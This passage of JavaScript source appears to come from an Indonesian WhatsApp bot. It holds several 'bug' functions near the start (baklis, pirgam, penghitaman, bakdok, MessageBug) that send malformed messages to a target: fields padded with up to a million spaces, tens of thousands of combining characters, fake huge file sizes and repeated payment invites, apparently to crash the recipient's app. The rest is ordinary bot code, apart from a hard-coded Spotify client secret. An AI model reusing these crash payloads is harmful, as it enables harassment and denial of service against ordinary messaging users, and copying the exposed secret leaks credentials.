await rafatharcode.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rafatharcode.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}


async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await rafatharcode.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return rafatharcode.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: rafatharcode.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #rafatharcodedominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rafatharcode.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rafatharcode.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await rafatharcode.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
if (isAntiLink) {
if (budy.match('chat.whatsapp', 'wa.me', 't.me')) {
if (!isBotAdmins) return !0
if (isAdmins) return !0
if (isOwner) return !0
await rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await rafatharcode.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}}

if (isAntiLinkgc) {
if (budy.match('chat.whatsapp')) {
if (!isBotAdmins) return !0
if (isAdmins) return !0
if (isOwner) return !0
await rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await rafatharcode.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('rafatharcode.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
m.reply(response)
}}

async function tiktokSearchVideo(query) {
return new Promise(async (resolve, reject) => {
axios("https://tikwm.com/api/feed/search", {
headers: {
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
cookie: "current_language=en",
"User-Agent":
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
},
data: {
keywords: query,
count: 12,
cursor: 0,
web: 1,
hd: 1,
},
method: "POST",
}).then((res) => {
resolve(res.data.data);
});
});
}

async function searchSpotifyTracks(query) {
const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');
const getToken = async () => {
const response = await fetch('https://accounts.spotify.com/api/token', {
method: 'POST',
timeout: 60000,
body: new URLSearchParams({
grant_type: 'client_credentials'
}),
headers: {
Authorization: `Basic ${auth}`
},
});
return (
await response.json()).access_token;
};

const accessToken = await getToken();
const offset = 10;
const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
const response = await fetch(searchUrl, {
  headers: {
Authorization: `Bearer ${accessToken}`
  },
});
const data = await response.json();
return data.tracks.items;
}

function happymod(query) {
return new Promise((resolve, reject) => {
axios.get(`https://www.happymod.com/search.html?q=${query}`).then(async tod => {
const $ = cheerio.load(tod.data)
let hasil = []
$("div.pdt-app-box").each(function(c, d) {
let name = $(d).find("a").text().trim();
let icon = $(d).find("img.lazy").attr('data-original');
let link = $(d).find("a").attr('href');
let link2 = `https://www.happymod.com${link}`
const Data = {
icon: icon,
name: name,
link: link2
}
hasil.push(Data)
})
resolve(hasil);
}).catch(reject)
});
}

async function loading () {
var nln = [
"LX • • •",
"LX • • • • •",
"LX • • • • • • •",
"LX • • • • •",
"LX • • •",
"LX • • • • •",
"LX • • • • • • •",
]
let { key } = await rafatharcode.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(700, 900)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await rafatharcode.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await rafatharcode.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await rafatharcode.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await rafatharcode.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await rafatharcode.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit5 (tex1, tex2, tex3, tex4, tex5) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`,
`${tex4}`,
`${tex5}`
]
let { key } = await rafatharcode.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(900, 1500)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await rafatharcode.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function ditt(...texts) {
let { key } = await rafatharcode.sendMessage(from, {text: 'Loading...'}, { quoted: m });
let duh = randomNomor(500, 800);
for (let i = 0; i < texts.length; i++) {
await sleep(duh);
await rafatharcode.sendMessage(from, {text: texts[i], edit: key}, { quoted: m });
}}

async function buttonurl(chat, teks, url1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": url1
}
],
})})
}}
}, { quoted: jm })

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function buttonurl2(chat, teks, url1, url2, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": url1
},
{
"name": "cta_url",
"buttonParamsJson": url2
}
],
})})
}}
}, { quoted: jm })

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function quickreply2(chat, teks, quick1, quick2, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
},
{
"name": "quick_reply",
"buttonParamsJson": quick2
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function listbut(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`,
serverMessageId: 145
},
businessMessageForwardInfo: {
businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id)
},
externalAdReply: {
title: `${ucapanWaktu} kak`,
body: `${bulan} ${tahun}`,
thumbnailUrl: global.thumb,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
document: fs.readFileSync('./lib/thumbnail/thumbnail.jpg'),
mimetype: "image/png",
fileLength: 99999999999999,
jpegThumbnail: fs.readFileSync('./lib/thumbnail/thumbnail.jpg'),
fileName: "RafatharCode",
}, {
upload: rafatharcode.waUploadToServer
}))
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function listbut2(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
document: fs.readFileSync('./lib/thumbnail/thumbnail.jpg'),
mimetype: "image/png",
fileLength: 99999999999999,
jpegThumbnail: fs.readFileSync('./lib/thumbnail/thumbnail.jpg'),
fileName: "RafatharCode",
}, {
upload: rafatharcode.waUploadToServer
}))
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function buttoncopy(chat, teks, copynye, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { 
businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": copynye
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function sendbutton(chat, teks, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { 
businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}]
})})
}}
}, { quoted: jm})
await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}

if (body && full_args && isPc) {
if (db.data.users[m.sender].nolan) {
if (!m.fromMe) {
try {
let result = await fetchJson(`https://skizo.tech/api/openai?apikey=${skizapi}&messages=Array&system=ubah%20gaya%20bicara%20mu%20agar%20lebih%20karateristik%20dan%20lebih%20terbuka%20dan%20namamu%20adalah%20Rafathar%20Project%20yang%20diciptakan%20oleh%20RafatharCode%20tugasmu%20membantu%20user%20Rafathar%20Project%20ekspresi%20kan%20sifat%20mu%20dengan%20emoji%20dan%20bicara%20yang%20lebih%20tidak%20Formal%20dan%20panggilanmu%20adalah%20gue%20dan%20lu%20layaknya%20seorang%20manusia,%20kamu%20sedang%20berbicara%20dengan%20${db.data.users[m.sender].nama},%20ingat%20${db.data.users[m.sender].nama}%20adalah%20lawan%20bicara%20kamu!&text=${encodeURIComponent(full_args)}`);
const noll = `${result.result}`;
m.reply(noll);
} catch (err) {
console.log(err);
}}}
}

async function streamToBuffer(stream) {
return new Promise((resolve, reject) => {
let chunks = [];
stream.on('data', chunk => chunks.push(chunk));
stream.on('end', () => resolve(Buffer.concat(chunks)));
stream.on('error', reject);
});
}

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

async function resize(buffer, width, height) {
var oyy = await Jimp.read(buffer);
var kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

try {
var ppuser = await rafatharcode.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://telegra.ph/file/2324daab2ea7ce51596fa.jpg'}
let ppnyauser = await getBuffer(ppuser)

const nebal = (angka) => {
return Math.floor(angka)
}

    const sendLoadingMessage = async (chatId) => {
        return await rafatharcodereply(chatId, 'Loading...', m);
    };

    const downloaddMP3 = async (url) => {
        let ytmp3Link = `https://widipe.com/download/ytdl?url=${encodeURIComponent(url)}`;
        try {
            let response = await fetch(ytmp3Link);
            let result = await response.json();
            if (result.status) {
                let mp3Link = result.result.mp3;
                let audioResponse = await fetch(mp3Link);
                let audioArrayBuffer = await audioResponse.arrayBuffer();
                return audioArrayBuffer;
            } else {
                return null;
            }
        } catch (e) {
            return null;
        }
    };

const downloadMp4 = async (Link) => {
try{
let yutub = await y2matemp4(Link)
//if (yutub.size < 104857600) {
const Cap = `*${yutub.title}*\n\nID: ${yutub.vid}`;
await rafatharcode.sendMessage(m.chat, { video: { url: yutub.video["360"].url }, caption: Cap,gifPlayback: false},{quoted: m})
/*} else {
await m.reply(`File video ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch(err) {
m.reply(`${err}`)
}}

const downloadMp3 = async (Link) => {
try{
let yutub = await y2matemp3(Link)
//if (yutub.size < 62914560) {
await rafatharcode.sendMessage(m.chat, {audio: { url: yutub.audio["128"].url }, mimetype: 'audio/mpeg', contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "YOUTUBE - PLAY",
body: yutub.title,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: yutub.thumbnail,
sourceUrl: Link
}
}},{ quoted: m })
/*} else {
await m.reply(`File audio ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch (err){
console.log(color(err))
}}

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
rafatharcode.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
rafatharcode.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}}

let list = []
for (let i of own) {
list.push({
displayName: await rafatharcode.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rafatharcode.getName(i + '@s.whatsapp.net')}\n
FN:${await rafatharcode.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Rafatharhelp@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://RafatharCode.com
item3.X-ABLabel:Channel\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

//==========================

if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
m.reply(`*GAME FAMILY 100*\nJawaban kamu benar!\n\nJawaban: ${i}\n\n${jawaban.length < 1 ? 'Semua jawaban sudah tertebak!\nHadiah: 12 limit' : 'Sisa yang belum ditebak : '+jawaban.length}`)
}}
if (jawaban.length < 1){
addLimit(usere, 12, db_limit)
clearTimeout(waktu);
delete family100[from];
}}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?.nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) {
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi invalid',
0: 'Posisi invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game telah berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game telah berakhir` : `Ketik .nyerah tuk menyerah`}`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await rafatharcode.sendText(room.x, str, m, { mentions: parseMention(str) } )
await rafatharcode.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}}

let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'Wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
pokl = `@${roof.p2.split('@')[0]} menolak suit, S
suit dibatalkan!`
await rafatharcode.sendTeks(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

1. @${roof.p.split('@')[0]}
2. @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"`
await rafatharcode.sendTeks(from, ggy, fkontak)
if (!roof.pilih) await rafatharcode.sendTeks(roof.p, teksbbb+'\n\n• Gunting\n• Batu\n• Kertas', m)
if (!roof.pilih2) await rafatharcode.sendTeks(roof.p2, teksbbb+'\n\n• Gunting\n• Batu\n• Kertas', m)
roof.waktu_milih = setTimeout(async() => {
